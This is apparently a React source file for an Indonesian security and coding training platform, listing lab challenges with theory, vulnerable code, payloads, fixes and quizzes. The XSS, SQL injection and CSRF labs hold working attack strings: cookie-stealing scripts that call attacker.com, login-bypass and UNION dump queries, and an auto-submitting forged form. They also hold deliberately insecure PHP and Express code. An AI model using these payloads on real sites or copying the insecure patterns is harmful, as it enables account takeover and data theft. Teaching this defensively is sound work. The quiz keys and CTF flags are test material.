'use client'
import { useState, useEffect } from 'react'
import { useParams } from 'next/navigation'
import Link from 'next/link'
import Navbar from '@/components/layout/Navbar'
import toast from 'react-hot-toast'

// Challenge definitions with full content
const CHALLENGE_DATA = {
  'xss-reflected': {
    title: 'XSS: Reflected Attack Lab',
    icon: '🎯',
    difficulty: 'Beginner',
    xp: 100,
    category: 'Security Lab',
    objective: 'Temukan dan eksploitasi celah XSS Reflected pada form pencarian yang tidak aman. Setelah berhasil, pelajari cara memperbaikinya.',
    theory: `## Apa itu Reflected XSS?

XSS (Cross-Site Scripting) Reflected terjadi ketika server **langsung memantulkan** input user ke dalam halaman tanpa proses sanitasi. Script berbahaya dieksekusi di browser korban.

## Cara Kerja

\`\`\`
1. Attacker kirim link berisi payload XSS ke korban
2. Korban klik link → request ke server dengan payload
3. Server "reflect" payload langsung ke HTML response
4. Browser korban eksekusi script berbahaya
5. Attacker bisa curi cookie, session, atau redirect ke phishing site
\`\`\`

## Dampak Nyata

- **Pencurian session/cookie** → attacker login sebagai korban
- **Keylogging** → semua ketikan korban terekam
- **Phishing** → tampilkan form palsu di website asli
- **Defacement** → ubah tampilan halaman`,
    vulnerable: `<!-- KODE RENTAN (jangan gunakan di production!) -->
<!-- Search form yang tidak aman -->
<form action="/search" method="GET">
  <input type="text" name="q" placeholder="Cari...">
  <button>Search</button>
</form>

<!-- Server-side (PHP contoh) - BERBAHAYA! -->
<?php
  $query = $_GET['q'];  // Input langsung dipakai tanpa sanitasi!
  echo "<p>Hasil untuk: " . $query . "</p>";  // XSS!
?>

<!-- Node.js Express - BERBAHAYA! -->
app.get('/search', (req, res) => {
  const q = req.query.q  // Tidak di-sanitize!
  res.send(\`<p>Hasil: \${q}</p>\`)  // Reflected XSS!
})`,
    payloads: [
      { label: 'Basic Alert', code: '<script>alert("XSS!")</script>', desc: 'Payload paling dasar — cek apakah script dieksekusi' },
      { label: 'Cookie Steal', code: '<script>document.location="http://attacker.com/steal?c="+document.cookie</script>', desc: 'Curi cookie session dan kirim ke server attacker' },
      { label: 'IMG Onerror', code: '<img src=x onerror="alert(\'XSS via img\')">', desc: 'Bypass filter yang block script tag dengan event handler' },
      { label: 'SVG Onload', code: '<svg onload="alert(\'XSS via SVG\')">', desc: 'Eksploitasi via SVG — bypass filter yang hanya block <script>' },
    ],
    fix: `## Cara Mencegah Reflected XSS

### 1. Escape Output (WAJIB)

\`\`\`javascript
// ✅ AMAN - Escape semua karakter berbahaya
function escapeHTML(str) {
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;')
    .replace(/\\//g, '&#x2F;')
}

// Server-side (Express)
app.get('/search', (req, res) => {
  const q = escapeHTML(req.query.q || '')
  res.send(\`<p>Hasil: \${q}</p>\`)  // Aman!
})
\`\`\`

### 2. Content Security Policy Header

\`\`\`javascript
// Tambah di next.config.js atau server
res.setHeader('Content-Security-Policy',
  "default-src 'self'; script-src 'self'"
)
// CSP mencegah inline script dan script dari domain lain
\`\`\`

### 3. Gunakan Framework yang Aman

\`\`\`jsx
// ✅ React otomatis escape output
function SearchResult({ query }) {
  return <p>Hasil: {query}</p>  // React escape ini otomatis!
}

// ❌ BAHAYA - jangan gunakan dangerouslySetInnerHTML!
function Bad({ query }) {
  return <p dangerouslySetInnerHTML={{ __html: query }} />  // XSS!
}
\`\`\`

### 4. Input Validation

\`\`\`javascript
function validateSearchInput(input) {
  // Hanya izinkan karakter yang dibutuhkan
  return input.replace(/[<>"'&]/g, '').slice(0, 200)
}
\`\`\``,
    quiz: [
      { q: 'Apa perbedaan Reflected XSS dan Stored XSS?', options: ['Tidak ada perbedaan', 'Reflected hanya ada di URL, Stored tersimpan di database', 'Stored lebih mudah dieksploitasi', 'Reflected lebih berbahaya'], correct: 1 },
      { q: 'Cara paling efektif mencegah XSS output?', options: ['Gunakan HTTPS', 'Escape semua output HTML', 'Rate limiting', 'Firewall'], correct: 1 },
      { q: 'Apa fungsi Content Security Policy (CSP)?', options: ['Enkripsi data', 'Batasi sumber script yang diizinkan browser', 'Rate limiting', 'CORS management'], correct: 1 },
      { q: 'Payload <img src=x onerror="..."> digunakan untuk?', options: ['Load gambar', 'Bypass filter yang block script tag', 'Optimasi gambar', 'Lazy loading'], correct: 1 },
      { q: 'React mencegah XSS dengan cara?', options: ['Menggunakan HTTPS', 'Otomatis escape semua output JSX', 'Blokir semua input', 'Enkripsi data'], correct: 1 },
    ],
  },
  'xss-stored': {
    title: 'XSS: Stored Attack Lab',
    icon: '💾',
    difficulty: 'Intermediate',
    xp: 200,
    category: 'Security Lab',
    objective: 'Temukan celah Stored XSS pada fitur komentar dan pelajari cara melakukan sanitasi input sebelum disimpan ke database.',
    theory: `## Apa itu Stored XSS?

Stored XSS (Persistent XSS) terjadi ketika payload berbahaya **disimpan secara permanen** di server (misal di database forum, komentar, atau profil). Payload ini kemudian dikirimkan ke semua user yang mengakses halaman tersebut.

## Cara Kerja

\`\`\`
1. Attacker memposting komentar berisi script berbahaya
2. Server menyimpan komentar (termasuk script) ke database tanpa sanitasi
3. User lain membuka halaman komentar
4. Server mengirimkan komentar dari database ke browser user
5. Browser user mengeksekusi script berbahaya milik attacker secara otomatis
\`\`\`

## Dampak Nyata

- **Mass Account Takeover**: Mencuri session semua user yang melihat postingan.
- **Worm**: Script yang otomatis memposting dirinya sendiri ke profil user lain.
- **Defacement**: Mengubah konten website untuk semua pengunjung.`,
    vulnerable: `// KODE RENTAN - Contoh pada fitur komentar
// API Route (Node.js/Express)

app.post('/api/comments', async (req, res) => {
  const { content } = req.body;
  
  // ❌ BAHAYA: Langsung simpan ke database tanpa sanitasi!
  const comment = await Comment.create({
    content: content, 
    userId: req.user.id
  });
  
  res.json(comment);
});

// Client-side Rendering
function CommentList({ comments }) {
  return (
    <div>
      {comments.map(c => (
        // ❌ BAHAYA: Render HTML mentah dari database!
        <div dangerouslySetInnerHTML={{ __html: c.content }} />
      ))}
    </div>
  );
}`,
    payloads: [
      { label: 'Persistent Alert', code: '<script>alert("Komentar ini mengandung XSS!")</script>', desc: 'Script akan jalan setiap kali halaman dibuka' },
      { label: 'Steal All Cookies', code: '<script>fetch("https://attacker.com/log?c=" + document.cookie)</script>', desc: 'Kirim cookie setiap pengunjung ke server attacker' },
      { label: 'Redirect User', code: '<img src=x onerror="window.location=\'https://phishing-site.com\'">', desc: 'Redirect otomatis semua pengunjung halaman' },
    ],
    fix: `## Cara Mencegah Stored XSS

### 1. Sanitasi Input (Server-side)

Gunakan library seperti **DOMPurify** atau **sanitize-html** sebelum menyimpan data ke database.

\`\`\`javascript
const createDOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');
const window = new JSDOM('').window;
const DOMPurify = createDOMPurify(window);

app.post('/api/comments', async (req, res) => {
  // ✅ AMAN: Bersihkan HTML dari tag/atribut berbahaya
  const cleanContent = DOMPurify.sanitize(req.body.content);
  
  const comment = await Comment.create({
    content: cleanContent,
    userId: req.user.id
  });
  res.json(comment);
});
\`\`\`

### 2. Gunakan Text Content (Client-side)

Jangan pernah gunakan \`dangerouslySetInnerHTML\` kecuali benar-benar diperlukan dan sudah di-sanitize.

\`\`\`jsx
// ✅ AMAN: React akan meng-escape konten secara otomatis
function Comment({ content }) {
  return <div className="comment">{content}</div>;
}
\`\`\`

### 3. HTTP-Only Cookies

Set cookie session sebagai \`HttpOnly\` agar tidak bisa diakses oleh JavaScript (mencegah pencurian session via XSS).

\`\`\`javascript
res.cookie('session', token, {
  httpOnly: true, // ✅ Mencegah document.cookie akses
  secure: true,
  sameSite: 'strict'
});
\`\`\``,
    quiz: [
      { q: 'Mengapa Stored XSS lebih berbahaya dari Reflected XSS?', options: ['Lebih sulit dideteksi', 'Payload tersimpan di server dan menyerang banyak user sekaligus', 'Hanya bisa dilakukan oleh admin', 'Membutuhkan database SQL'], correct: 1 },
      { q: 'Kapan sanitasi data sebaiknya dilakukan?', options: ['Hanya di frontend', 'Hanya saat menampilkan data', 'Sebelum data disimpan ke database (server-side)', 'Tidak perlu jika pakai HTTPS'], correct: 2 },
      { q: 'Apa fungsi flag HttpOnly pada cookie?', options: ['Mempercepat loading', 'Mencegah JavaScript mengakses cookie tersebut', 'Enkripsi isi cookie', 'Menghapus cookie otomatis'], correct: 1 },
      { q: 'Library mana yang populer untuk sanitasi HTML?', options: ['React', 'DOMPurify', 'Express', 'Mongoose'], correct: 1 },
      { q: 'Manakah tempat penyimpanan payload Stored XSS yang umum?', options: ['URL Parameter', 'Database (Komentar/Profil)', 'Local Storage', 'Browser Cache'], correct: 1 },
    ],
  },
  'sqli-basic': {
    title: 'SQL Injection: Basic Lab',
    icon: '💉',
    difficulty: 'Beginner',
    xp: 120,
    category: 'Security Lab',
    objective: 'Pahami cara SQL Injection bekerja pada login form yang tidak aman, lalu implementasikan pencegahannya.',
    theory: `## Apa itu SQL Injection?

SQL Injection terjadi ketika attacker menyisipkan kode SQL berbahaya ke dalam input yang langsung digunakan dalam query database tanpa sanitasi.

## Cara Kerja

\`\`\`sql
-- Query normal (username: "budi", password: "secret123")
SELECT * FROM users 
WHERE username = 'budi' AND password = 'secret123'

-- Dengan payload SQLi: username = "' OR '1'='1' --"
SELECT * FROM users 
WHERE username = '' OR '1'='1' --' AND password = '...'
-- Komentar (--) membuat AND password tidak dieksekusi
-- '1'='1' selalu TRUE → login berhasil tanpa password!
\`\`\``,
    vulnerable: `// KODE RENTAN - Jangan gunakan di production!
// Login tanpa parameterized query

// PHP (contoh buruk)
$username = $_POST['username'];  // Langsung dari user!
$password = $_POST['password'];
$query = "SELECT * FROM users WHERE username = '$username' 
          AND password = '$password'";
// Payload: username = ' OR '1'='1' --

// Node.js (contoh buruk)
app.post('/login', async (req, res) => {
  const { username, password } = req.body
  // String concatenation langsung - BAHAYA!
  const query = \`SELECT * FROM users 
                 WHERE username = '\${username}' 
                 AND password = '\${password}'\`
  const user = await db.query(query)  // SQLi vulnerability!
})`,
    payloads: [
      { label: 'Auth Bypass', code: "' OR '1'='1' --", desc: 'Bypass login - kondisi selalu TRUE, komentar skip password check' },
      { label: 'Admin Login', code: "admin' --", desc: "Login sebagai admin tanpa password - comment out AND password='...'" },
      { label: 'Union Based', code: "' UNION SELECT null, username, password FROM users --", desc: 'Dump semua username dan password dari tabel users' },
      { label: "Error Based", code: "' OR 1=CONVERT(int,'a') --", desc: 'Trigger error yang menampilkan informasi database' },
    ],
    fix: `## Cara Mencegah SQL Injection

### 1. Parameterized Query / Prepared Statement (WAJIB!)

\`\`\`javascript
// ✅ AMAN - Parameterized query di Node.js (mysql2)
const [rows] = await db.execute(
  'SELECT * FROM users WHERE username = ? AND password = ?',
  [username, hashedPassword]  // Parameter dipisah dari query
)

// ✅ AMAN - PostgreSQL
const result = await pool.query(
  'SELECT * FROM users WHERE username = $1 AND password = $2',
  [username, hashedPassword]
)
\`\`\`

### 2. ORM (MongoDB/Mongoose - sudah aman by default)

\`\`\`javascript
// ✅ AMAN - Mongoose tidak rentan SQLi
// Tapi tetap sanitize untuk NoSQL Injection!
const user = await User.findOne({
  email: sanitizedEmail,  // Sanitize dulu!
  // JANGAN: User.findOne(req.body) - NoSQL injection!
})
\`\`\`

### 3. Input Validation

\`\`\`javascript
function validateLoginInput(data) {
  const { username, password } = data
  
  // Strip karakter berbahaya
  if (typeof username !== 'string') throw new Error('Invalid')
  if (username.includes("'") || username.includes('"')) {
    throw new Error('Karakter tidak diizinkan')
  }
  
  // Length check
  if (username.length > 50 || password.length > 128) {
    throw new Error('Input terlalu panjang')
  }
}
\`\`\``,
    quiz: [
      { q: "Payload ' OR '1'='1' -- menyebabkan apa?", options: ['Error database', 'Login berhasil tanpa password yang benar', 'Database terhapus', 'Server crash'], correct: 1 },
      { q: 'Cara paling efektif mencegah SQL Injection?', options: ['Firewall', 'Parameterized query / prepared statement', 'HTTPS', 'Rate limiting'], correct: 1 },
      { q: 'Apa yang dilakukan karakter -- di SQL?', options: ['Multiplication', 'Decrement', 'Memulai komentar sampai akhir baris', 'String concatenation'], correct: 2 },
      { q: 'NoSQL Injection terjadi pada?', options: ['MySQL saja', 'MongoDB jika input ($where, $gt dll) tidak di-sanitize', 'Redis', 'SQLite'], correct: 1 },
      { q: 'Mengapa ORM seperti Mongoose lebih aman dari raw query?', options: ['ORM lebih cepat', 'ORM otomatis parameterize query dan sanitize input', 'ORM tidak butuh database', 'ORM gratis'], correct: 1 },
    ],
  },
  'csrf-lab': {
    title: 'CSRF: Cross-Site Request Lab',
    icon: '🔄',
    difficulty: 'Intermediate',
    xp: 180,
    category: 'Security Lab',
    objective: 'Simulasikan serangan CSRF untuk mengubah data user lain dan pelajari cara implementasi CSRF Token.',
    theory: `## Apa itu CSRF?

CSRF (Cross-Site Request Forgery) adalah serangan yang memaksa user yang sudah terautentikasi untuk melakukan aksi yang tidak diinginkan pada web aplikasi tempat mereka sedang login.

## Cara Kerja

\`\`\`
1. User login ke bank.com (mendapat session cookie)
2. User mengunjungi website berbahaya (attacker.com) tanpa logout dari bank.com
3. attacker.com memiliki script/form tersembunyi yang mengirim request ke bank.com/transfer
4. Browser mengirim request tersebut beserta cookie bank.com milik user
5. bank.com memproses request karena menganggap itu request sah dari user
\`\`\`

## Syarat Serangan
- User harus memiliki session aktif di target site.
- Target site hanya mengandalkan cookie untuk autentikasi.
- Aksi memiliki parameter yang bisa ditebak (misal: \`amount\`, \`to\`).`,
    vulnerable: `<!-- KODE RENTAN - Form tanpa CSRF Protection -->
<form action="/api/user/update-email" method="POST">
  <input type="email" name="email" value="new@email.com">
  <button type="submit">Update Email</button>
</form>

<!-- Malicious Site (attacker.com) -->
<body onload="document.forms[0].submit()">
  <form action="https://bank.com/api/user/update-email" method="POST">
    <input type="hidden" name="email" value="hacker@evil.com">
  </form>
</body>`,
    payloads: [
      { label: 'Hidden Auto-Submit Form', code: '<form action="https://target.com/api/profile" method="POST" id="csrf">\n  <input type="hidden" name="bio" value="Hacked!">\n</form>\n<script>document.getElementById("csrf").submit()</script>', desc: 'Form tersembunyi yang submit otomatis saat halaman dibuka' },
      { label: 'Image Tag GET Request', code: '<img src="https://target.com/api/logout" style="display:none">', desc: 'Memaksa user logout (jika logout menggunakan GET)' },
    ],
    fix: `## Cara Mencegah CSRF

### 1. Anti-CSRF Token (Synchronizer Token Pattern)

Sertakan token unik dan random yang dihasilkan server untuk setiap sesi atau request.

\`\`\`html
<!-- Server menyisipkan token unik -->
<form action="/update" method="POST">
  <input type="hidden" name="csrf_token" value="a7b8c9d0...">
  <input type="text" name="data">
  <button>Kirim</button>
</form>
\`\`\`

### 2. SameSite Cookie Attribute

Gunakan atribut \`SameSite=Strict\` atau \`SameSite=Lax\` pada cookie session.

\`\`\`javascript
res.cookie('session', token, {
  httpOnly: true,
  sameSite: 'Strict' // ✅ Cookie tidak akan dikirim pada cross-site requests
});
\`\`\`

### 3. Verifikasi Origin/Referer Header

Periksa header \`Origin\` atau \`Referer\` di server untuk memastikan request berasal dari domain yang sah.`,
    quiz: [
      { q: 'Apa kepanjangan dari CSRF?', options: ['Cross-Site Request Forgery', 'Client-Side Request Failure', 'Common Service Response Format', 'Cross-Site Resource Fetch'], correct: 0 },
      { q: 'Manakah proteksi paling efektif terhadap CSRF?', options: ['HTTPS', 'Anti-CSRF Token', 'Password yang kuat', 'Input validation'], correct: 1 },
      { q: 'Atribut cookie apa yang membantu mencegah CSRF?', options: ['Secure', 'HttpOnly', 'SameSite', 'Path'], correct: 2 },
      { q: 'CSRF memanfaatkan apa untuk menyerang?', options: ['Kelemahan password user', 'Kepercayaan browser terhadap cookie session yang otomatis dikirim', 'Celah di database', 'Koneksi internet yang lambat'], correct: 1 },
      { q: 'Apakah CSRF bisa mencuri data user?', options: ['Ya, selalu', 'Tidak, CSRF hanya melakukan aksi (state-changing), bukan mencuri data', 'Hanya jika user adalah admin', 'Hanya di browser lama'], correct: 1 },
    ],
  },
  'algo-sort': {
    title: 'Implementasi Sorting Algorithm',
    icon: '📊',
    difficulty: 'Beginner',
    xp: 80,
    category: 'Coding',
    objective: 'Implementasikan 3 algoritma sorting dari nol menggunakan JavaScript. Pahami kompleksitas waktu masing-masing.',
    theory: `## Sorting Algorithms

### Bubble Sort — O(n²)
Bandingkan elemen berdekatan, swap jika salah urutan. Ulangi hingga terurut.

### Selection Sort — O(n²)  
Cari elemen terkecil, pindahkan ke posisi yang benar. Lebih efisien dari Bubble.

### Quick Sort — O(n log n) rata-rata
Pilih pivot, pisahkan elemen lebih kecil dan lebih besar, rekursi.`,
    vulnerable: `// STARTER CODE - Lengkapi implementasinya!

// 1. BUBBLE SORT
function bubbleSort(arr) {
  const a = [...arr]  // jangan mutasi original
  const n = a.length
  
  for (let i = 0; i < n - 1; i++) {
    for (let j = 0; j < n - i - 1; j++) {
      // TODO: Bandingkan a[j] dan a[j+1]
      // Jika a[j] > a[j+1], swap!
      if (a[j] > a[j+1]) {
        [a[j], a[j+1]] = [a[j+1], a[j]]
      }
    }
  }
  return a
}

// 2. SELECTION SORT
function selectionSort(arr) {
  const a = [...arr]
  const n = a.length
  
  for (let i = 0; i < n - 1; i++) {
    let minIdx = i
    for (let j = i + 1; j < n; j++) {
      // TODO: Cari index elemen terkecil
      if (a[j] < a[minIdx]) minIdx = j
    }
    // TODO: Swap a[i] dengan a[minIdx]
    [a[i], a[minIdx]] = [a[minIdx], a[i]]
  }
  return a
}

// 3. QUICK SORT
function quickSort(arr) {
  if (arr.length <= 1) return arr
  
  const pivot = arr[Math.floor(arr.length / 2)]
  // TODO: Pisahkan elemen ke left, middle, right
  const left = arr.filter(x => x < pivot)
  const mid = arr.filter(x => x === pivot)
  const right = arr.filter(x => x > pivot)
  
  return [...quickSort(left), ...mid, ...quickSort(right)]
}

// TEST
const data = [64, 34, 25, 12, 22, 11, 90]
console.log("Bubble:", bubbleSort(data))
console.log("Selection:", selectionSort(data))
console.log("Quick:", quickSort(data))
// Expected: [11, 12, 22, 25, 34, 64, 90]`,
    payloads: [
      { label: 'Bubble Sort Answer', code: `function bubbleSort(arr) {\n  const a = [...arr]\n  const n = a.length\n  for (let i = 0; i < n - 1; i++) {\n    for (let j = 0; j < n - i - 1; j++) {\n      if (a[j] > a[j + 1]) {\n        [a[j], a[j + 1]] = [a[j + 1], a[j]]\n      }\n    }\n  }\n  return a\n}`, desc: 'Implementasi Bubble Sort lengkap dengan swap menggunakan destructuring' },
      { label: 'Quick Sort Answer', code: `function quickSort(arr) {\n  if (arr.length <= 1) return arr\n  const pivot = arr[Math.floor(arr.length / 2)]\n  const left = arr.filter(x => x < pivot)\n  const middle = arr.filter(x => x === pivot)\n  const right = arr.filter(x => x > pivot)\n  return [...quickSort(left), ...middle, ...quickSort(right)]\n}`, desc: 'Implementasi Quick Sort rekursif yang bersih' },
    ],
    fix: `## Solusi Lengkap

\`\`\`javascript
// BUBBLE SORT - O(n²)
function bubbleSort(arr) {
  const a = [...arr]
  for (let i = 0; i < a.length - 1; i++) {
    for (let j = 0; j < a.length - i - 1; j++) {
      if (a[j] > a[j + 1]) [a[j], a[j+1]] = [a[j+1], a[j]]
    }
  }
  return a
}

// SELECTION SORT - O(n²)
function selectionSort(arr) {
  const a = [...arr]
  for (let i = 0; i < a.length - 1; i++) {
    let minIdx = i
    for (let j = i + 1; j < a.length; j++) {
      if (a[j] < a[minIdx]) minIdx = j
    }
    if (minIdx !== i) [a[i], a[minIdx]] = [a[minIdx], a[i]]
  }
  return a
}

// QUICK SORT - O(n log n)
function quickSort(arr) {
  if (arr.length <= 1) return arr
  const pivot = arr[Math.floor(arr.length / 2)]
  const left = arr.filter(x => x < pivot)
  const mid = arr.filter(x => x === pivot)
  const right = arr.filter(x => x > pivot)
  return [...quickSort(left), ...mid, ...quickSort(right)]
}
\`\`\``,
    quiz: [
      { q: 'Kompleksitas waktu Bubble Sort?', options: ['O(n)', 'O(n log n)', 'O(n²)', 'O(1)'], correct: 2 },
      { q: 'Quick Sort lebih cepat dari Bubble Sort karena?', options: ['Menggunakan lebih banyak memori', 'Kompleksitas O(n log n) vs O(n²)', 'Lebih sederhana', 'Tidak ada perbedaan'], correct: 1 },
      { q: 'Apa itu "pivot" di Quick Sort?', options: ['Elemen pertama selalu', 'Elemen yang dipilih sebagai pembatas untuk partisi', 'Elemen terbesar', 'Index tengah selalu'], correct: 1 },
      { q: 'Array [3, 1, 2] setelah 1 pass Bubble Sort?', options: ['[1, 2, 3]', '[1, 3, 2]', '[3, 1, 2]', '[2, 1, 3]'], correct: 1 },
      { q: 'Kapan lebih baik pakai .sort() bawaan JavaScript?', options: ['Tidak pernah', 'Selalu, karena sudah dioptimasi engine', 'Hanya untuk angka kecil', 'Hanya untuk string'], correct: 1 },
    ],
  },
  'algo-ds': {
    title: 'Data Structures: Stack & Queue',
    icon: '🗂️',
    difficulty: 'Intermediate',
    xp: 150,
    category: 'Coding',
    objective: 'Implementasikan struktur data Stack dan Queue menggunakan JavaScript Class.',
    theory: `## Stack & Queue

### Stack (LIFO - Last In First Out)
Analogi: Tumpukan piring. Elemen terakhir yang masuk adalah yang pertama keluar.
- **push**: Tambah elemen ke atas.
- **pop**: Ambil elemen dari atas.

### Queue (FIFO - First In First Out)
Analogi: Antrian kasir. Elemen pertama yang masuk adalah yang pertama keluar.
- **enqueue**: Tambah elemen ke belakang.
- **dequeue**: Ambil elemen dari depan.`,
    vulnerable: `// IMPLEMENTASI STACK
class Stack {
  constructor() { this.items = [] }
  // TODO: Implementasikan push, pop, peek, isEmpty
  push(item) { this.items.push(item) }
  pop() { return this.items.pop() }
  peek() { return this.items[this.items.length - 1] }
  isEmpty() { return this.items.length === 0 }
}

// IMPLEMENTASI QUEUE
class Queue {
  constructor() { this.items = [] }
  // TODO: Implementasikan enqueue, dequeue, front, isEmpty
  enqueue(item) { this.items.push(item) }
  dequeue() { return this.items.shift() }
  front() { return this.items[0] }
  isEmpty() { return this.items.length === 0 }
}`,
    payloads: [
      { label: 'Stack Implementation', code: 'class Stack {\n  constructor() { this.items = [] }\n  push(item) { this.items.push(item) }\n  pop() { return this.items.pop() }\n  peek() { return this.items[this.items.length - 1] }\n  isEmpty() { return this.items.length === 0 }\n}', desc: 'Class Stack dasar dengan array' },
      { label: 'Queue Implementation', code: 'class Queue {\n  constructor() { this.items = [] }\n  enqueue(item) { this.items.push(item) }\n  dequeue() { return this.items.shift() }\n  front() { return this.items[0] }\n  isEmpty() { return this.items.length === 0 }\n}', desc: 'Class Queue dasar dengan array' },
    ],
    fix: `## Solusi Lengkap

\`\`\`javascript
class Stack {
  constructor() { this.items = [] }
  push(item) { this.items.push(item) }
  pop() { return this.items.pop() }
  peek() { return this.items[this.items.length - 1] }
  isEmpty() { return this.items.length === 0 }
  size() { return this.items.length }
}

class Queue {
  constructor() { this.items = [] }
  enqueue(item) { this.items.push(item) }
  dequeue() { return this.items.shift() }
  front() { return this.items[0] }
  isEmpty() { return this.items.length === 0 }
  size() { return this.items.length }
}
\`\`\``,
    quiz: [
      { q: 'Prinsip kerja Stack adalah?', options: ['FIFO', 'LIFO', 'FILO', 'Random'], correct: 1 },
      { q: 'Prinsip kerja Queue adalah?', options: ['FIFO', 'LIFO', 'LILO', 'Random'], correct: 0 },
      { q: 'Method untuk mengambil elemen teratas Stack tanpa menghapusnya?', options: ['pop()', 'push()', 'peek()', 'top()'], correct: 2 },
      { q: 'Operasi dequeue pada Queue menghapus elemen di bagian?', options: ['Belakang', 'Tengah', 'Depan', 'Semua'], correct: 2 },
      { q: 'Contoh penggunaan Stack di dunia nyata?', options: ['Antrian bank', 'Fitur Undo/Redo di text editor', 'Playlist lagu', 'Streaming video'], correct: 1 },
    ],
  },
  'api-build': {
    title: 'Build REST API dari Nol',
    icon: '🔌',
    difficulty: 'Intermediate',
    xp: 200,
    category: 'Coding',
    objective: 'Bangun struktur REST API dasar menggunakan Node.js dan Express.',
    theory: `## REST API Fundamentals

REST (Representational State Transfer) adalah standar arsitektur untuk web service.

### HTTP Methods
- **GET**: Ambil data.
- **POST**: Buat data baru.
- **PUT/PATCH**: Update data.
- **DELETE**: Hapus data.

### Status Codes
- **200 OK**: Berhasil.
- **201 Created**: Berhasil membuat resource.
- **400 Bad Request**: Input salah.
- **401 Unauthorized**: Butuh login.
- **404 Not Found**: Resource tidak ada.
- **500 Server Error**: Kesalahan server.`,
    vulnerable: `const express = require('express');
const app = express();
app.use(express.json());

let users = [];

// TODO: Implementasikan GET /users
app.get('/users', (req, res) => {
  res.json(users);
});

// TODO: Implementasikan POST /users
app.post('/users', (req, res) => {
  const user = req.body;
  users.push(user);
  res.status(201).json(user);
});`,
    payloads: [
      { label: 'Basic Express Setup', code: "const express = require('express');\nconst app = express();\napp.use(express.json());\napp.listen(3000);", desc: 'Setup minimal server Express' },
      { label: 'GET Route', code: "app.get('/api/resource', (req, res) => {\n  res.json({ data: 'success' });\n});", desc: 'Contoh route GET' },
    ],
    fix: `## Solusi Lengkap

\`\`\`javascript
const express = require('express');
const app = express();
app.use(express.json());

let users = [];

app.get('/api/users', (req, res) => {
  res.json(users);
});

app.post('/api/users', (req, res) => {
  const { name, email } = req.body;
  if (!name || !email) return res.status(400).json({ error: 'Missing fields' });
  const newUser = { id: Date.now(), name, email };
  users.push(newUser);
  res.status(201).json(newUser);
});

app.listen(3000, () => console.log('Server running on port 3000'));
\`\`\``,
    quiz: [
      { q: 'Method HTTP untuk mengambil data?', options: ['POST', 'GET', 'PUT', 'DELETE'], correct: 1 },
      { q: 'Status code 201 berarti?', options: ['OK', 'Created', 'Bad Request', 'Not Found'], correct: 1 },
      { q: 'Middleware express.json() digunakan untuk?', options: ['Koneksi DB', 'Parsing body request JSON', 'Logging', 'Security'], correct: 1 },
      { q: 'REST singkatan dari?', options: ['Representational State Transfer', 'Remote State Transfer', 'Resource State Trust', 'Real-time State Transfer'], correct: 0 },
      { q: 'Method untuk mengupdate data secara keseluruhan?', options: ['GET', 'POST', 'PUT', 'PATCH'], correct: 2 },
    ],
  },
  'regex-master': {
    title: 'Regex Master Challenge',
    icon: '🔤',
    difficulty: 'Advanced',
    xp: 250,
    category: 'Coding',
    objective: 'Selesaikan tantangan Regular Expression untuk validasi data.',
    theory: `## Regular Expressions (Regex)

Regex adalah pola yang digunakan untuk mencocokkan kombinasi karakter dalam string.

### Karakter Spesial
- **^**: Awal string.
- **$**: Akhir string.
- **.**: Karakter apapun.
- **\\d**: Angka.
- **\\w**: Alfanumerik.
- **+**: Satu atau lebih.
- **\\***: Nol atau lebih.
- **?**: Nol atau satu.`,
    vulnerable: `// TANTANGAN REGEX
// 1. Validasi Email
const emailRegex = /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/;

// 2. Validasi Nomor Telepon (ID: 08...)
const phoneRegex = /^08\\d{9,11}$/;

// 3. Extract angka dari string "Order #12345"
const orderStr = "Order #12345";
const orderId = orderStr.match(/\\d+/)[0];`,
    payloads: [
      { label: 'Email Regex', code: "/^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/", desc: 'Regex sederhana untuk validasi email' },
      { label: 'Number Only', code: "/^\\d+$/", desc: 'Hanya mengizinkan angka' },
    ],
    fix: `## Solusi Lengkap

\`\`\`javascript
// Email Validation
const isEmail = (str) => /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/.test(str);

// Phone Number (Indonesia)
const isPhone = (str) => /^08\\d{9,11}$/.test(str);

// Extract Hashtags
const extractHashtags = (text) => text.match(/#\\w+/g);

// Password Strength (Min 8 char, 1 letter, 1 number)
const isStrong = (pw) => /^(?=.*[A-Za-z])(?=.*\\d)[A-Za-z\\d]{8,}$/.test(pw);
\`\`\``,
    quiz: [
      { q: 'Simbol untuk awal string di Regex?', options: ['$', '^', '*', '+'], correct: 1 },
      { q: 'Simbol \\d mewakili?', options: ['Huruf', 'Angka', 'Spasi', 'Simbol'], correct: 1 },
      { q: 'Regex untuk validasi email yang benar?', options: ['/email/', '/.+@.+\\..+/', '/^[a-z]+$/', '/\\d+/'], correct: 1 },
      { q: 'Apa arti dari tanda + di Regex?', options: ['Nol atau lebih', 'Satu atau lebih', 'Tepat satu', 'Opsional'], correct: 1 },
      { q: 'Bagaimana cara melakukan case-insensitive search di Regex?', options: ['Pakai flag /i', 'Pakai flag /g', 'Pakai flag /m', 'Tidak bisa'], correct: 0 },
    ],
  },
  'ctf-token': {
    title: 'Find the Hidden Token',
    icon: '🔑',
    difficulty: 'Intermediate',
    xp: 300,
    category: 'CTF',
    objective: 'Cari token tersembunyi yang disembunyikan di tempat-tempat tidak terduga dalam halaman web.',
    theory: `## Reconnaissance (Recon)

Dalam CTF, langkah pertama adalah mengumpulkan informasi. Attacker sering mencari informasi di:
- **Source Code**: Komentar HTML (\`<!-- ... -->\`).
- **Network Tab**: Response header atau API response.
- **Cookies/Local Storage**: Data sensitif yang disimpan di browser.
- **Hidden Files**: \`robots.txt\`, \`.git\`, \`.env\`.`,
    vulnerable: `<!-- HINT: Cek komentar ini -->
<!-- FLAG: CodeBook{h1dd3n_1n_html_c0mm3nt} -->

<script>
  // Hidden in variable
  const secret = "Q29kZUJvb2t7anNfdmFyX3Rva2VufQ=="; // Base64
</script>`,
    payloads: [
      { label: 'Inspect Element', code: 'F12 -> Elements -> Ctrl+F "flag"', desc: 'Cari kata kunci flag di source code' },
      { label: 'Check Cookies', code: 'console.log(document.cookie)', desc: 'Lihat semua cookie yang aktif' },
    ],
    fix: `## Solusi & Lokasi Flag

1. **Flag 1 (HTML Comment)**:
   Buka View Source (Ctrl+U) atau Inspect Element.
   \`CodeBook{h1dd3n_1n_html_c0mm3nt}\`

2. **Flag 2 (JS Variable)**:
